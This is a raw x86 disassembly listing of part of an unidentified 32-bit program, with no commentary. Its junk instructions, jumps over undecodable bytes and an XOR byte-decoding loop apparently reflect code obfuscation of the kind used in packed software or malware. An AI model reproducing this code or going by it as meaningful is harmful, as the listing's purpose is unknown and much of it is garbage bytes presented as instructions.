  4109b8:	jnp    0x4109d0
  4109ba:	lea    edi,[eax+0x1f]
  4109bd:	cs ins BYTE PTR es:[edi],dx
  4109bf:	inc    eax
  4109c0:	push   ebx
  4109c1:	hlt    
  4109c2:	and    DWORD PTR [ebp-0x482ad075],ebx
  4109c8:	(bad)  
  4109ca:	mov    ebp,0x44f103ca
  4109cf:	je     0x410959
  4109d1:	push   ss
  4109d2:	mov    bh,0x98
  4109d4:	out    0xc,al
  4109d6:	shl    BYTE PTR [edi+0x6202ee0],cl
  4109dc:	jbe    0x4109bc
  4109de:	inc    ebx
  4109df:	imul   ebx,DWORD PTR [esp+eax*4+0x7c0663ca],0x2176c9e6
  4109ea:	cmp    al,0xd3
  4109ec:	push   edx
  4109ed:	push   cs
  4109ee:	adc    DWORD PTR [ecx+0x7680290b],ebx
  4109f4:	fadd   QWORD PTR [ebx-0x1fd0222c]
  4109fa:	inc    edx
  4109fb:	cld    
  4109fc:	lock cmp bh,dh
  4109ff:	adc    DWORD PTR [ecx+esi*8],esi
  410a02:	jae    0x4109cf
  410a04:	add    BYTE PTR [ebp+0x2a],dh
  410a07:	sbb    edi,edx
  410a09:	cmp    BYTE PTR [edx],ah
  410a0b:	std    
  410a0c:	jp     0x410a00
  410a0e:	xlat   BYTE PTR ds:[ebx]
  410a0f:	pop    ss
  410a10:	and    dh,ah
  410a12:	mov    al,ds:0x75c44b78
  410a17:	(bad)  
  410a19:	test   DWORD PTR [edi-0x6f],ecx
  410a1c:	inc    edx
  410a1d:	mov    dh,0x45
  410a1f:	ret    
  410a20:	fnstenv [eax]
  410a22:	xchg   edi,eax
  410a23:	jecxz  0x410a08
  410a25:	stc    
  410a26:	mov    BYTE PTR [eax],dl
  410a28:	push   ebx
  410a29:	leave  
  410a2a:	test   DWORD PTR [esi+ebp*8+0x8],0x119f60b6
  410a32:	adc    ebx,DWORD PTR [edi]
  410a34:	push   ebp
  410a35:	test   eax,0xe3a78edf
  410a3a:	fmul   QWORD PTR [eax+eax*1]
  410a3d:	mov    ah,0xcc
  410a3f:	fidiv  WORD PTR [esi]
  410a41:	stos   DWORD PTR es:[edi],eax
  410a42:	pop    esp
  410a43:	sub    DWORD PTR [ebx+0x24],ebx
  410a46:	fdivr  QWORD PTR [eax+0x9]
  410a49:	xacquire xchg DWORD PTR [esi+0x14988b13],ebx
  410a50:	(bad)  
  410a51:	rcl    DWORD PTR [eax+esi*4],cl
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4336e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4336bf
  410a95:	sbb    eax,DWORD PTR ds:0x433743
  410a9b:	mov    ds:0x4336bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4336b7,0x4336ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4336af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433667,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4336f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43362b,0x433637
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43362b
  410b09:	sbb    DWORD PTR ds:0x433673,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	pop    edx
  410b21:	sbb    DWORD PTR [ebx],eax
  410b23:	stc    
  410b24:	or     eax,0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410ac3
  410b2d:	mov    bl,cl
  410b2f:	lock repnz pop es
  410b32:	addr16 pop ebx
  410b34:	and    DWORD PTR [eax],esi
  410b36:	inc    ebp
  410b37:	call   0x7dd8:0xabfaffd7
  410b3e:	jns    0x410b45
  410b40:	les    edx,FWORD PTR [eax+0x4ba99de0]
  410b46:	arpl   cx,bp
  410b48:	repnz sbb edx,0xfffffffc
  410b4c:	push   ebx
  410b4d:	mov    ecx,DWORD PTR [edx-0x6a]
  410b50:	fsubr  QWORD PTR [edi]
  410b52:	adc    al,BYTE PTR [eax*4-0x7bafc5b3]
  410b59:	add    DWORD PTR [ebp-0x49c81c68],0x1e
  410b60:	add    esp,DWORD PTR [ecx]
  410b62:	mov    edi,0x4f8b5d2
  410b67:	inc    edi
  410b68:	inc    ebp
  410b69:	xlat   BYTE PTR ds:[ebx]
  410b6a:	push   esi
  410b6b:	out    0x12,eax
  410b6d:	sbb    al,BYTE PTR [edi+0x17]
  410b70:	fisub  DWORD PTR [eax+0x77f78c60]
  410b76:	aaa    
  410b77:	lock fimul WORD PTR [edx]
  410b7a:	jge    0x410bac
  410b7c:	pushf  
  410b7d:	sub    BYTE PTR [edi],dl
  410b7f:	int3   
  410b80:	ret    0x6590
  410b83:	sbb    edi,DWORD PTR [ecx+0x33]
  410b86:	fwait
  410b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b88:	mov    bl,al
  410b8a:	popf   
  410b8b:	push   DWORD PTR [edx+0x6e]
  410b8e:	add    eax,0x3d023b80
  410b93:	push   ds
  410b94:	pop    dx
  410b96:	(bad)
  410b9a:	test   bh,dl
  410b9c:	scas   al,BYTE PTR es:[edi]
  410b9d:	das    
  410b9e:	stos   DWORD PTR es:[edi],eax
  410b9f:	cmp    BYTE PTR ds:0x1dea30e6,dl
  410ba5:	je     0x410c07
  410ba7:	cmp    DWORD PTR [ebx-0x4f],esp
  410baa:	fdivr  DWORD PTR [ecx-0x2a]
  410bad:	mov    al,ds:0x64a56b31
  410bb2:	shr    DWORD PTR [ebp-0x77],cl
  410bb5:	loope  0x410b79
  410bb7:	mov    DWORD PTR [edx+edi*2-0x6a],ecx
  410bbb:	mov    BYTE PTR [eax],al
  410bbd:	mov    eax,ds:0x65c9e7c5
  410bc2:	xor    eax,0x655926c9
  410bc7:	mov    esi,DWORD PTR [ebx]
  410bc9:	pop    esi
  410bca:	add    DWORD PTR [eax+0xf5c9820],0xd4b7a8a6
  410bd4:	call   0x11aae7ae
  410bd9:	cwde   
  410bda:	popf   
  410bdb:	sub    esp,DWORD PTR [eax-0x27]
  410bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bdf:	xor    eax,0xdf1b3c09
  410be4:	lahf   
  410be5:	ror    edi,1
  410be7:	test   DWORD PTR [ebx+ecx*8],0x1db32a57
  410bee:	add    DWORD PTR [ebp-0x40d86df7],esp
  410bf4:	mov    bh,0x70
  410bf6:	repnz arpl WORD PTR [eax+0x50],dx
  410bfa:	outs   dx,DWORD PTR ds:[esi]
  410bfb:	fptan  
  410bfd:	jo     0x410ba0
  410bff:	push   ebp
  410c00:	stos   BYTE PTR es:[edi],al
  410c01:	dec    esp
  410c02:	lea    ebp,[eax]
  410c04:	push   ecx
  410c05:	add    DWORD PTR [edi-0x3ae4c776],edi
  410c0b:	xchg   ecx,eax
  410c0c:	ret    0x3058
  410c0f:	pushf  
  410c10:	push   ebp
  410c11:	imul   esp,DWORD PTR [ebp-0x772b9c4c],0xfffffff8
  410c18:	sbb    esi,DWORD PTR [ebx+0x588fe48c]
  410c1e:	lds    eax,FWORD PTR [ebp+0x58]
  410c21:	xor    eax,0xf2ef9b65
  410c26:	les    esi,FWORD PTR [ecx-0x2ae50485]
  410c2c:	sar    DWORD PTR [ecx],cl
  410c2e:	(bad)  
  410c2f:	bound  ecx,QWORD PTR [ecx]
  410c31:	mulps  xmm0,XMMWORD PTR [ebp-0x28]
  410c35:	mov    al,ds:0xe0f9b0d7
  410c3a:	push   ebx
  410c3b:	lahf   
  410c3c:	int3   
  410c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c3e:	adc    eax,0x2fa4db4d
  410c43:	cmp    eax,0x921bb57b
  410c48:	and    eax,0x5fc8855c
  410c4d:	sahf   
  410c4e:	popa   
  410c4f:	lea    esi,[esi+0x73]
  410c52:	sti    
  410c53:	shr    BYTE PTR [ecx+0x3],1
  410c56:	push   0xd39ef5
  410c5b:	xor    BYTE PTR [ebp-0x3b],ch
  410c5e:	pop    eax
  410c5f:	dec    edi
  410c60:	dec    ebp
  410c61:	adc    al,0xb6
  410c63:	sbb    dh,BYTE PTR [ebx-0x7179633a]
  410c69:	add    ebx,DWORD PTR [esi-0x7f55f0dd]
  410c6f:	rcr    BYTE PTR [ebp+esi*1+0xcd390fa],1
  410c76:	mov    ds:0xfe490a,al
  410c7b:	cld    
  410c7c:	pop    eax
  410c7d:	retf   0x97bf
  410c80:	pop    eax
  410c81:	xchg   edx,eax
  410c82:	push   0x86c79ec
  410c87:	xchg   esi,eax
  410c88:	sbb    sp,bx
  410c8b:	xchg   esp,eax
  410c8c:	mov    dl,0x17
  410c8e:	adc    eax,ebp
  410c90:	xor    al,0x5
  410c93:	jae    0x410cc1
  410c95:	mov    dl,dl
  410c97:	outs   dx,DWORD PTR ds:[esi]
  410c98:	inc    ecx
  410c99:	jno    0x410c38
  410c9b:	scas   eax,DWORD PTR es:[edi]
  410c9c:	(bad)  
  410c9d:	cmp    dh,BYTE PTR ds:0xf570bf92
  410ca3:	sbb    al,0x47
  410ca6:	cmp    eax,0xbcc3baf4
  410cab:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410cb2:	or     eax,eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4336ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43362f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43362f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43362f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43366b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43367f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43362f
  410d20:	add    eax,DWORD PTR ds:0x433703
  410d26:	mov    ds:0x43362f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43373f,0x17
  410d38:	cmp    DWORD PTR ds:0x43373f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43373f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43373f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43373f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43373f,eax
  410d84:	mov    eax,ds:0x43373f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43373f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433623,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43373b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4336b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    cl,dl
  410dcd:	test   DWORD PTR [eax],ebx
  410dcf:	scas   eax,DWORD PTR es:[edi]
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d94
  410dd9:	aas    
  410dda:	dec    edi
  410ddb:	data16 xor BYTE PTR [edi+0x2a96ea58],dh
  410de2:	ror    BYTE PTR [ebx-0x20831401],0x35
  410de9:	ins    BYTE PTR es:[edi],dx
  410dea:	mov    ch,0x61
  410dec:	xor    ah,al
  410dee:	mov    esi,0x845c4454
  410df3:	mov    DWORD PTR [edi+eax*2+0x3],edi
  410df7:	add    DWORD PTR [edx-0x4e],ecx
  410dfa:	mov    eax,0xc1242831
  410dff:	push   esp
  410e00:	mov    al,0x61
  410e02:	enter  0xa678,0xb0
  410e06:	jmp    0x1489:0xfe6c894
  410e0d:	dec    ebx
  410e0e:	(bad)  
  410e0f:	aas    
  410e10:	and    ch,0x42
  410e13:	iret   
  410e14:	mov    edx,0xf5706161
  410e19:	add    dh,0xbe
  410e1c:	add    DWORD PTR [eax+0x461b1076],esp
  410e22:	xchg   ecx,eax
  410e23:	jbe    0x410e8c
  410e25:	in     eax,0xdf
  410e27:	pop    edi
  410e28:	test   cl,al
  410e2a:	and    DWORD PTR [eax],ecx
  410e2c:	mov    ch,0x16
  410e2e:	mov    cs,ebp
  410e30:	clc    
  410e31:	mov    ebp,0xb94478fb
  410e36:	inc    ebx
  410e37:	scas   eax,DWORD PTR es:[edi]
  410e38:	mov    DWORD PTR [ecx-0x6d],ebx
  410e3b:	xor    ah,BYTE PTR [edi-0x4f608554]
  410e41:	adc    eax,0xd74df612
  410e46:	cmc    
  410e47:	(bad)  
  410e48:	fidivr DWORD PTR [ebx]
  410e4a:	jnp    0x410e09
  410e4c:	push   es
  410e4d:	push   0x93a7e593
  410e52:	jmp    0x1df5999b
  410e57:	popf   
  410e58:	test   al,0xff
  410e5a:	neg    BYTE PTR [ebp+0x74]
  410e5d:	div    ebx
  410e5f:	ins    DWORD PTR es:[edi],dx
  410e60:	or     eax,0x6d0e9e37
  410e65:	jb     0x410e5c
  410e67:	outs   dx,DWORD PTR ds:[esi]
  410e68:	jbe    0x410e79
  410e6a:	mov    eax,0xf6288846
  410e6f:	push   sp
  410e71:	call   0x7e3a:0xea4b521
  410e78:	in     eax,dx
  410e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e7a:	test   al,0xca
  410e7c:	sbb    DWORD PTR [edi],esp
  410e7e:	idiv   BYTE PTR [edi+0x56]
  410e81:	lea    esi,[edi+0x99a57a]
  410e87:	stos   BYTE PTR es:[edi],al
  410e88:	arpl   WORD PTR [esi+ebp*1-0x3d],di
  410e8c:	pop    esp
  410e8d:	popa   
  410e8e:	ret    
  410e8f:	data16 mov ?,WORD PTR [esi]
  410e92:	outs   dx,BYTE PTR ds:[esi]
  410e93:	shr    BYTE PTR [ebp+esi*4-0x36],1
  410e97:	push   edx
  410e98:	dec    edx
  410e99:	jg     0x410f13
  410e9b:	(bad)  
  410e9d:	inc    esi
  410e9e:	popa   
  410e9f:	or     al,0x23
  410ea1:	push   esp
  410ea2:	outs   dx,DWORD PTR ds:[esi]
  410ea3:	cmc    
  410ea4:	shl    BYTE PTR [edi*2-0x6e9d669d],0x8e
  410eac:	imul   esp,ebp,0xc4562b3b
  410eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb3:	call   0x2be8db48
  410eb8:	out    dx,al
  410eb9:	inc    ebp
  410eba:	in     eax,0x89
  410ebc:	mov    es,WORD PTR [ebp+0x39]
  410ebf:	je     0x410e9d
  410ec1:	xor    BYTE PTR [ecx+0x6c45e03d],ah
  410ec7:	bound  ebx,QWORD PTR [esi+0x57de0431]
  410ecd:	inc    DWORD PTR [esi]
  410ecf:	enter  0x2e1,0x9d
  410ed3:	adc    ebp,DWORD PTR [ebp+0x8d50978]
  410ed9:	or     al,0xf5
  410edb:	ins    BYTE PTR es:[edi],dx
  410edc:	lea    edx,[edi+0x9]
  410edf:	xor    esp,DWORD PTR [ecx-0xc]
  410ee2:	fs out 0x26,al
  410ee5:	leave  
  410ee6:	sub    bl,bl
  410ee8:	xor    eax,0x57b1f8c6
  410eed:	fcomp  DWORD PTR [esi]
  410eef:	(bad)  
  410ef0:	dec    ebx
  410ef1:	(bad)  
  410ef2:	push   edx
  410ef3:	(bad)  
  410ef4:	in     al,dx
  410ef5:	mov    bh,0x21
  410ef7:	push   eax
  410ef8:	in     eax,0x6b
  410efa:	cmp    al,0xcf
  410efc:	mov    eax,0x782f7609
  410f01:	int3   
  410f02:	rcl    BYTE PTR [edi],cl
  410f04:	inc    eax
  410f05:	jnp    0x410f6a
  410f07:	sub    ebx,DWORD PTR [ebx+0x2fd520ab]
  410f0d:	mov    BYTE PTR [ebx-0x59cf615f],bl
  410f13:	test   al,0x72
  410f15:	popa   
  410f16:	mov    DWORD PTR [ebx],edx
  410f18:	test   al,0xa6
  410f1a:	test   ebp,ebx
  410f1c:	jg     0x410ee6
  410f1e:	and    al,0xd8
  410f20:	sub    eax,0x94990b7
  410f25:	aad    0x21
  410f27:	mov    DWORD PTR [edi+eiz*1],ebx
  410f2a:	lods   eax,DWORD PTR ds:[esi]
  410f2b:	jge    0x410f5a
  410f2d:	xor    DWORD PTR [eax],0x3a
  410f30:	cmc    
  410f31:	aas    
  410f32:	jecxz  0x410ee5
  410f34:	cmp    eax,0x885b44b9
  410f39:	ja     0x410ed5
  410f3b:	fwait
  410f3c:	ins    DWORD PTR es:[edi],dx
  410f3d:	dec    edx
  410f3e:	push   0x36
  410f40:	jbe    0x410f89
  410f42:	xchg   ebx,eax
  410f43:	lods   al,BYTE PTR ds:[esi]
  410f44:	test   DWORD PTR [ecx+0x4c06b0e6],0x10bcf2f
  410f4e:	fabs   
  410f50:	rcr    DWORD PTR [eax+0x3b],0xb0
  410f54:	bnd jnp 0x410f9d
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43372f
  410f65:	sub    DWORD PTR ds:0x433733,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43367f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43367f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43367f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4336b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43367f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43367f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43367f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43367f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43367f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	add    DWORD PTR [edx+0x450f9a23],ebp
  410ffe:	jle    0x41107e
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41107b
  411005:	inc    ebx
  411006:	pop    ss
  411007:	xchg   ebx,eax
  411008:	add    DWORD PTR [edi+0x25fcc4b4],esi
  41100e:	adc    BYTE PTR [esp+esi*2+0x1ea3e53a],ah
  411015:	(bad)  
  411016:	addr16 addr16 jbe 0x411045
  41101a:	jg     0x410fc2
  41101c:	adc    dh,BYTE PTR [eax]
  41101e:	fistp  DWORD PTR [ecx]
  411020:	call   0xc9c6:0xf01f10f0
  411027:	adc    dl,cl
  411029:	mov    ch,dl
  41102b:	sub    bh,ch
  41102d:	jb     0x41101c
  41102f:	daa    
  411030:	push   ds
  411031:	dec    ebx
  411032:	aam    0x46
  411034:	mov    BYTE PTR [ecx],ch
  411036:	bound  esi,QWORD PTR [ebx+ebx*8+0x207b974c]
  41103d:	jge    0x41102d
  41103f:	sub    ch,cl
  411041:	retf   0x3253
  411044:	xchg   BYTE PTR [eax+0x797c7817],bl
  41104a:	adc    BYTE PTR [esi],dh
  41104c:	pop    ds
  41104d:	div    BYTE PTR [edx-0x1a]
  411050:	and    BYTE PTR [eax-0x2042ac14],ch
  411056:	sahf   
  411057:	lds    edi,FWORD PTR [edi]
  411059:	adc    al,0x1e
  41105b:	cmp    al,0x1d
  41105d:	push   ebp
  41105e:	rcl    DWORD PTR [edi+0x6e1ee0b8],cl
  411064:	outs   dx,DWORD PTR ds:[esi]
  411065:	(bad)  
  411066:	mov    DWORD PTR [ecx+0x60addcd2],edx
  41106c:	or     eax,0xb9cac5da
  411071:	sbb    DWORD PTR [ebx],edx
  411073:	and    ah,BYTE PTR [ebx]
  411075:	pop    edi
  411076:	push   esi
  411077:	gs into 
  411079:	test   eax,0x2e4ab345
  41107e:	sbb    eax,ebp
  411080:	pushf  
  411081:	test   al,0x70
  411083:	jmp    0xb432a22c
  411088:	push   esp
  411089:	adc    eax,0x232b727d
  41108e:	in     al,0x1f
  411090:	aam    0x73
  411092:	cmp    ah,BYTE PTR [ebp-0x18]
  411095:	xchg   esp,eax
  411096:	jg     0x41106b
  411098:	inc    eax
  411099:	xchg   DWORD PTR [ecx-0x578fa28e],eax
  41109f:	in     eax,0xcf
  4110a1:	inc    ebx
  4110a2:	xchg   edx,eax
  4110a3:	lds    esp,FWORD PTR [eax+0x4984d09e]
  4110a9:	mov    al,ds:0x8c85f4a6
  4110ae:	mov    ah,0xde
  4110b0:	test   eax,0x192baaad
  4110b5:	retf   0x496d
  4110b8:	xchg   ebx,eax
  4110b9:	outs   dx,DWORD PTR ds:[esi]
  4110ba:	sbb    ecx,ebx
  4110bc:	ret    0x6756
  4110bf:	test   eax,0xe205c22
  4110c4:	pop    ebp
  4110c5:	inc    ebx
  4110c6:	or     al,0xed
  4110c8:	mov    edi,0x3ffa686a
  4110cd:	fdiv   st,st(2)
  4110cf:	xor    DWORD PTR [ecx-0x22],eax
  4110d2:	xor    ecx,edi
  4110d4:	xor    al,0x80
  4110d6:	mov    esp,0x6238afe7
  4110db:	lock pop ebp
  4110dd:	(bad)  
  4110de:	mov    edi,0xfc34b89d
  4110e3:	in     eax,0xe
  4110e5:	add    ecx,ecx
  4110e7:	out    0x24,eax
  4110e9:	cmc    
  4110ea:	push   edi
  4110eb:	cmp    edx,edi
  4110ed:	sar    esp,0xb7
  4110f0:	and    BYTE PTR [edi-0x53],0xcc
  4110f4:	out    dx,al
  4110f5:	jne    0x4110d5
  4110f7:	xchg   edx,eax
  4110f8:	xchg   esp,eax
  4110f9:	and    BYTE PTR [ebx+0x48],cl
  4110fc:	loope  0x411114
  4110fe:	sbb    ah,BYTE PTR [edx-0x25]
  411101:	add    bh,dl
  411103:	xor    edi,DWORD PTR fs:[edi+0x71]
  411107:	pop    ds
  411108:	add    al,0x86
  41110a:	rol    BYTE PTR [eax],cl
  41110c:	stos   DWORD PTR es:[edi],eax
  41110d:	sbb    ah,dh
  41110f:	repnz mov edx,0xc8e50d69
  411115:	cmp    eax,0xf84ed35f
  41111a:	pop    eax
  41111b:	out    dx,al
  41111c:	xchg   BYTE PTR ds:[edi+0x2f],bh
  411120:	push   ebp
  411121:	stos   DWORD PTR es:[edi],eax
  411122:	std    
  411123:	dec    eax
  411124:	aaa    
  411125:	test   dl,0xbe
  411128:	scas   eax,DWORD PTR es:[edi]
  411129:	or     dl,BYTE PTR [esi]
  41112b:	xchg   ebx,eax
  41112c:	dec    ecx
  41112d:	cmp    eax,0x642a6b53
  411132:	cmp    eax,0x530df3bd
  411137:	inc    eax
  411138:	popf   
  411139:	xchg   esp,eax
  41113a:	in     al,0x9d
  41113c:	push   0xffffff8a
  41113e:	retf   
  41113f:	je     0x4111b6
  411141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411142:	stos   DWORD PTR es:[edi],eax
  411143:	sub    al,0x81
  411145:	xor    al,0x74
  411147:	das    
  411148:	fcomp  DWORD PTR [ecx]
  41114a:	and    DWORD PTR [edi-0x7ca2a231],eax
  411150:	stos   DWORD PTR es:[edi],eax
  411151:	(bad)  
  411152:	lock push esi
  411154:	mov    WORD PTR [ecx+0x586e2302],?
  41115a:	cmc    
  41115b:	xchg   dl,dh
  41115d:	xchg   edx,eax
  41115e:	push   es
  41115f:	gs es call 0xd11d:0x6f40a7cf
  411168:	push   esi
  411169:	pop    edi
  41116a:	inc    esp
  41116b:	loope  0x4111a1
  41116d:	sub    eax,0xa83ec3df
  411172:	ret    
  411173:	stos   BYTE PTR es:[edi],al
  411174:	scas   al,BYTE PTR es:[edi]
  411175:	or     dl,dl
  411177:	inc    edx
  411178:	(bad)  
  411179:	sub    ch,BYTE PTR [eax+ebx*4+0x40]
  41117d:	lds    edi,FWORD PTR [eax+0x36]
  411180:	test   al,dh
  411182:	or     al,0xbf
  411184:	add    bh,BYTE PTR [ebx]
  411186:	add    BYTE PTR [eax],al
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x63dabba7
  4111f1:	cmp    ch,0x4c
  4111f4:	mov    es,WORD PTR [edx+0x7e]
  4111f7:	jle    0x4111ea
  4111f9:	jg     0x411279
  4111fb:	jle    0x41118a
  4111fd:	repz dec ebx
  4111ff:	jb     0x411274
  411201:	leave  
  411202:	mov    DWORD PTR [ecx+0x34e31fba],esp
  411208:	int    0x79
  41120a:	outs   dx,BYTE PTR ds:[esi]
  41120b:	sub    al,BYTE PTR [ecx-0x6d]
  41120e:	and    eax,0xa5172ef8
  411213:	iret   
  411214:	pusha  
  411215:	dec    eax
  411216:	dec    eax
  411217:	jmp    0xa3f9:0x66b57094
  41121e:	out    dx,al
  41121f:	je     0x411208
  411221:	sub    edx,DWORD PTR [edx+0x313dbc0b]
  411227:	dec    esp
  411228:	mov    WORD PTR [edx+esi*2],cs
  41122b:	adc    esi,ebx
  41122d:	aaa    
  41122e:	jb     0x411244
  411230:	inc    eax
  411231:	jnp    0x4111f2
  411233:	cmp    dh,al
  411235:	cmp    ch,BYTE PTR [ebx-0x3a]
  411238:	push   0x6c18f2f
  41123d:	(bad)  
  41123e:	ror    DWORD PTR [esi+ecx*2],0x7c
  411242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411243:	pop    edi
  411244:	adc    DWORD PTR [eax+0x77],ebp
  411247:	scas   al,BYTE PTR es:[edi]
  411248:	dec    ebp
  411249:	adc    al,0x8
  41124b:	jne    0x411220
